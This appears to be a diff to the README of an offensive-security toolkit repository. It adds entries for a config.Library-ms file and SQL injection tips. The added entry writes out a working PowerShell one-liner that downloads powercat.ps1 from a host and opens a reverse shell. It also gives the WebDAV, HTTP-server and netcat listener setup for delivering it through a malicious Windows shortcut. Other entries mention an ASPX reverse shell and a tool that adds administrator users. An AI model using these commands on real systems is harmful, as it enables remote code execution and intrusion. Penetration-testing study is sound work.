@@ -9,6 +9,11 @@ Just change the host/port to whatever your listener is running on and maybe adju
 <b>checklist</b><br/>
 A very basic list of pentest steps.<br/>
 <br/>
+<b>config.Library-ms</b><br/>
+A config library file to open a connection to the address defined in the simple location url, which for example serves malicious Windows shortcut to execute some nasty powershell like:<br/>
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.12.34:9090/powercat.ps1'); powercat -c 192.168.12.34 -p 4000 -e powershell"<br/>
+Here you should have the following: wsgidav (WebDAV: wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/username/webdav/) server running, serving the Windows shortcut file, which runs the command above, a Python httpd (python -m http.server 9090) serving the powercat.ps1 and a netcat listener (nc -nvlp 4000) to catch the resulting reverse shell.<br/>
+<br/>
 <b>dorks.google</b><br/>
 Some random Google dorks to leverage while enriching your case data<br/>
 <br/>
@@ -41,6 +46,9 @@ Some PHP-tricks for offensive security<br/>
 <br/>
 <b>reverse_shell.aspx</b><br/>
 Not my creation, credit goes to INSOMNIA SECURITY :: InsomniaShell.aspx, brett.moore@insomniasec.com ::  www.insomniasec.com<br/>
+<br/>
+<b>sqli-tips</b><br/>
+Tips for SQL injections</br>
 <br/>
 <b>winbin.sh</b><br/>
 Whip up custom executable/dll on the fly. So far only supports creating a x64 executable/dll for adding a defined user with a defined password to the Administrators group or changing an existing user's password. <br/>
